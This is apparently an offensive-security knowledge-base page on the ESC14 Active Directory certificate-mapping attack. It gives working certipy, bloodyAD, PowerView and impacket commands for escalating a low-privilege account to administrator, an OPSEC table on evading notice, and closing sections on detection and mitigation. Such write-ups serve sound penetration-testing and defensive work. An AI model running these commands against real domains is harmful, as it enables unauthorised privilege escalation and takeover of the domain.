---
title: "ESC14 — Weak Explicit Certificate Mapping"
description: "ESC14 targets the altSecurityIdentities attribute on AD user and computer objects. This multi-valued attribute is used for explicit certificate-to-account…"
category: active-directory
tags: ["active-directory", "adcs", "privilege-escalation", "hashing"]
tools: ["Impacket", "Certipy", "BloodHound", "ldapsearch", "OpenSSL"]
difficulty: advanced
updated: "2026-08-10"
source: "vault:ActiveDirectory/ACL-ESC-Techniques/ESC14 — Weak Explicit Certificate Mapping.md"
---
# ESC14 — Weak Explicit Certificate Mapping

## Quick Reference

| Field | Value |
|-------|-------|
| **Category** | Explicit Certificate Mapping Abuse |
| **Difficulty** | Medium |
| **Pre-requisites** | Write access to `altSecurityIdentities` OR existing weak mapping on target |
| **Tools** | Certipy, BloodHound, PowerView, LDAP tools |
| **OPSEC Noise** | Medium — AD attribute modification |
| **One-liner** | Abuse weak explicit certificate mappings in `altSecurityIdentities` to bind your own certificate to a privileged account, or manipulate your account attributes to match an existing weak mapping on a target. |

***

## What Is ESC14?

ESC14 targets the `altSecurityIdentities` attribute on AD user and computer objects. This multi-valued attribute is used for **explicit certificate-to-account mapping** — it tells the DC "when this specific certificate is presented, map it to this specific account." The values in this attribute define **how** the mapping is performed.

The vulnerability: Windows supports multiple mapping types, and some are **cryptographically weak** — they rely on easily spoofable identifiers like the Subject Common Name or Issuer DN rather than unique, cryptographic identifiers like serial numbers or public key hashes.

ESC14 has **two distinct attack scenarios**:

| Scenario | Pre-requisite | Method |
|----------|--------------|--------|
| **ESC14a — Write Access** | `GenericWrite` on target's `altSecurityIdentities` | Add your own certificate mapping to the target account |
| **ESC14b — Existing Weak Mapping** | Target already has a weak mapping + `GenericWrite` on your own account | Modify your attributes to match the target's weak mapping criteria |

***

## Certificate Mapping Types — Strong vs Weak

The `altSecurityIdentities` attribute supports these formats:

| Mapping Type | Format | Strength | Spoofable? |
|-------------|--------|----------|------------|
| `X509:<I>issuer<S>subject` | Issuer + Subject DN | 🟡 Weak | ✅ If you control subject |
| `X509:<S>subject` | Subject DN only | 🔴 Very Weak | ✅ Easily |
| `X509:<I>issuer<SR>serial` | Issuer + Serial Number | 🟢 Strong | ❌ |
| `X509:<SKI>keyid` | Subject Key Identifier | 🟢 Strong | ❌ |
| `X509:<SHA1-PUKEY>hash` | SHA1 of Public Key | 🟢 Strong | ❌ |
| `X509:<RFC822>email` | RFC822 email (SAN) | 🔴 Very Weak | ✅ |

> ⚠️ The weak types (`X509:<S>`, `X509:<I><S>`, `X509:<RFC822>`) can be exploited because the attacker can **craft a certificate** (or modify their own AD attributes) to match the mapping criteria.

***

## Required Conditions

### ESC14a — Write Access to altSecurityIdentities

| Condition | Notes |
|-----------|-------|
| `GenericWrite` or `WriteProperty` on target's `altSecurityIdentities` | BloodHound ACE edge |
| You control a certificate (any cert you can authenticate with) | Even a self-signed cert works if added to NTAuthCA |
| **OR** access to legitimate enrollment | Standard ADCS enrollment |

### ESC14b — Existing Weak Mapping

| Condition | Notes |
|-----------|-------|
| Target account has a weak `altSecurityIdentities` mapping | `X509:<S>` or `X509:<I><S>` format |
| You have `GenericWrite` on **your own** account (or a controlled account) | To modify attributes to match the mapping |
| Access to a Client Auth template for enrollment | Standard ADCS enrollment |

***

## Step 0 — Enumeration

```bash
# Check for altSecurityIdentities on high-value targets
# From Linux via LDAP
ldapsearch -x -H ldap://$TARGET -D 'lowpriv@domain.htb' -w 'Password123!' \
  -b "DC=domain,DC=htb" \
  '(altSecurityIdentities=*)' dn altSecurityIdentities

# From PowerShell
Get-ADUser -Filter {altSecurityIdentities -like '*'} \
  -Properties altSecurityIdentities | 
  Select-Object Name, altSecurityIdentities

# Check for computer accounts too
Get-ADComputer -Filter {altSecurityIdentities -like '*'} \
  -Properties altSecurityIdentities |
  Select-Object Name, altSecurityIdentities
```

### BloodHound Queries

```cypher
// Find principals with write access to altSecurityIdentities on admin accounts
MATCH (n)-[r:GenericWrite|GenericAll|WriteProperty]->(m:User)
WHERE m.admincount = True
RETURN n.name, type(r), m.name

// Find accounts with altSecurityIdentities set
MATCH (n:User) WHERE n.altsecurityidentities IS NOT NULL
RETURN n.name, n.altsecurityidentities
```

***

## ESC14a — Write Access Attack Chain

When you have write access to a target's `altSecurityIdentities`, you simply **add a mapping** that points to a certificate you control.

### Step 1 — Request a Certificate for Yourself

```bash
certipy-ad req \
  -u 'lowpriv@domain.htb' \
  -p 'Password123!' \
  -dc-ip $TARGET \
  -ca 'DOMAIN-CA-NAME' \
  -template 'User'

# Output: lowpriv.pfx
```

### Step 2 — Extract Certificate Details

```bash
# Get the Subject DN from your certificate
certipy-ad cert -pfx lowpriv.pfx -nokey -out lowpriv.crt
openssl x509 -in lowpriv.crt -noout -subject -issuer

# Output example:
# subject= /DC=htb/DC=domain/CN=Users/CN=lowpriv
# issuer= /DC=htb/DC=domain/CN=DOMAIN-CA
```

### Step 3 — Add Explicit Mapping to Target Account

```bash
# Using BloodyAD
bloodyAD -d 'domain.htb' -u 'lowpriv' -p 'Password123!' --host $TARGET \
  set object administrator altSecurityIdentities \
  -v "X509:<I>DC=htb,DC=domain,CN=DOMAIN-CA<S>DC=htb,DC=domain,CN=Users,CN=lowpriv"

# Using PowerView
Set-DomainObject -Identity administrator \
  -Set @{'altSecurityIdentities'='X509:<I>DC=htb,DC=domain,CN=DOMAIN-CA<S>DC=htb,DC=domain,CN=Users,CN=lowpriv'}
```

### Step 4 — Authenticate as Administrator Using Your Certificate

```bash
certipy-ad auth \
  -pfx lowpriv.pfx \
  -username administrator \
  -domain domain.htb \
  -dc-ip $TARGET

# The DC checks administrator's altSecurityIdentities
# Finds a mapping matching your cert's Issuer+Subject
# Grants you access as administrator
```

### Step 5 — Clean Up (Remove the Mapping)

```bash
bloodyAD -d 'domain.htb' -u 'lowpriv' -p 'Password123!' --host $TARGET \
  set object administrator altSecurityIdentities -v ""
```

***

## ESC14b — Existing Weak Mapping Attack Chain

When the target already has a weak explicit mapping, you modify **your own account** to match the mapping criteria.

### Example Scenario

Target: `admin-svc` has mapping:
```
altSecurityIdentities: X509:<S>CN=Admin Service Account
```

This mapping only checks the Subject CN — anyone with a cert where `CN=Admin Service Account` will be mapped to this account.

### Step 1 — Modify Your Account's CN (If Possible)

```bash
# If you have GenericWrite on an account, modify its CN to match
# More commonly: create a new computer account with matching attributes
impacket-addcomputer \
  'domain.htb/lowpriv:Password123!' \
  -dc-ip $TARGET \
  -computer-name 'Admin Service Account$' \
  -computer-pass 'EvilPass!'
```

### Step 2 — Request Certificate with Matching Subject

```bash
certipy-ad req \
  -u 'Admin Service Account$@domain.htb' \
  -p 'EvilPass!' \
  -dc-ip $TARGET \
  -ca 'DOMAIN-CA-NAME' \
  -template 'Machine'

# The cert's Subject CN will match the weak mapping
```

### Step 3 — Authenticate as the Target

```bash
certipy-ad auth \
  -pfx 'admin service account.pfx' \
  -username 'admin-svc' \
  -domain domain.htb \
  -dc-ip $TARGET
```

***

## OPSEC Considerations

| Action | Log Generated | Noise Level |
|--------|--------------|-------------|
| Reading altSecurityIdentities | LDAP query — low noise | 🟢 Low |
| Writing altSecurityIdentities | Event ID 5136 (Directory Service Changes) | 🔴 High |
| Certificate enrollment | Event ID 4886/4887 | 🟢 Low |
| Auth with explicit mapping | Event ID 4768 | 🟡 Medium |

***

## Detection Indicators

- **Event ID 5136** — Modification of `altSecurityIdentities` attribute, especially on privileged accounts
- **Event ID 4768** — Certificate-based TGT request where the mapping source is `altSecurityIdentities` rather than UPN/SAN
- **Audit `altSecurityIdentities`** — Any value using weak mapping types (`X509:<S>`, `X509:<RFC822>`) on privileged accounts is a finding
- **BloodHound** — `GenericWrite` or `WriteProperty` edges to accounts with `altSecurityIdentities` set

***

## Mitigation

- **Use only strong mapping types** — Replace all `X509:<S>` and `X509:<I><S>` mappings with `X509:<I><SR>` (Issuer + Serial) or `X509:<SHA1-PUKEY>` (SHA1 Public Key Hash)
- **Restrict write access to `altSecurityIdentities`** — Only Tier 0 admins should be able to modify this attribute on any account
- **Audit all existing mappings** — Run a domain-wide query for `altSecurityIdentities` and review every value
- **Set `StrongCertificateBindingEnforcement = 2`** — Forces SID-based validation on implicit mappings, though explicit mappings via `altSecurityIdentities` may still work
- **Monitor for attribute changes** — Alert on any modification to `altSecurityIdentities` on privileged accounts
